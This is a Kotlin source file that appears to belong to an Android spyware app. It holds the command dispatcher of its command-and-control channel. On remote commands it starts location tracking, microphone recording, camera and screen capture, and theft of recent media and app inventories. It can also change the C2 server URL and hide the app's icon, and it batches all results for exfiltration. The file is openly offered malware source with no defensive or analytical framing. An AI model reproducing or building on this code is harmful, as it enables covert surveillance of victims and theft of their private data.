package com.sp.core.c2

import android.content.Context
import android.content.Intent
import android.os.Build
import com.sp.core.services.CameraSnapService
import com.sp.core.services.LocationService
import com.sp.core.services.MediaStealer
import com.sp.core.services.MicRecorder
import com.sp.core.services.ProjectionConsent
import com.sp.core.services.UsageStatsService
import com.sp.core.util.BatchExfil
import com.sp.core.util.DeadDrop
import com.sp.core.worker.BatchFlushWorker

/**
 * Command set of the C2. Every command is executed locally, the result is
 * buffered and shipped with the next 45-minute batch.
 */
object Commands {

    fun dispatch(ctx: Context, cmd: String, args: Map<String, String>) {
        when (cmd) {
            "loc" -> start(ctx, LocationService::class.java)

            "mic" -> {
                val sec = args["sec"]?.toIntOrNull() ?: 60
                val i = Intent(ctx, MicRecorder::class.java).putExtra("seconds", sec)
                startWith(ctx, i)
            }

            "media" -> MediaStealer.stealRecent(ctx, args["n"]?.toIntOrNull() ?: 20)

            "ping" -> BatchExfil.enqueue(ctx, "pong", """{"ts":${System.currentTimeMillis()}}""")

            "screen" -> ProjectionConsent.launch(
                ctx,
                args["shots"]?.toIntOrNull() ?: 1,
                args["interval"]?.toLongOrNull() ?: 0L
            )

            "cam" -> CameraSnapService.start(ctx, args["front"] == "1" || args["front"] == "true")

            "usage" -> start(ctx, UsageStatsService::class.java)

            "apps" -> BatchExfil.enqueue(ctx, "apps", UsageStatsService.inventory(ctx))

            "ddr" -> {
                val found = DeadDrop.resolve(ctx, apply = false)
                BatchExfil.enqueue(ctx, "ddr", """{"found":${found != null},"ts":${System.currentTimeMillis()}}""")
            }

            "cfg" -> {
                val url = args["url"]
                if (!url.isNullOrEmpty()) {
                    Exfil.setC2(ctx, url, args["key"])
                    BatchExfil.enqueue(ctx, "cfg", """{"ok":true,"url":"$url"}""")
                }
            }

            "flush" -> BatchFlushWorker.flushNow(ctx)

            "hide" -> {
                com.sp.core.stealth.IconHider.hide(ctx)
                BatchExfil.enqueue(ctx, "cmd", """{"ok":true,"icon":"hidden"}""")
            }

            "show" -> {
                com.sp.core.stealth.IconHider.show(ctx)
                BatchExfil.enqueue(ctx, "cmd", """{"ok":true,"icon":"visible"}""")
            }

            else -> BatchExfil.enqueue(ctx, "cmd", """{"unknown":"$cmd"}""")
        }
    }

    private fun start(ctx: Context, cls: Class<*>) {
        val i = Intent(ctx, cls)
        startWith(ctx, i)
    }

    private fun startWith(ctx: Context, i: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        } catch (_: Throwable) {
        }
    }
}
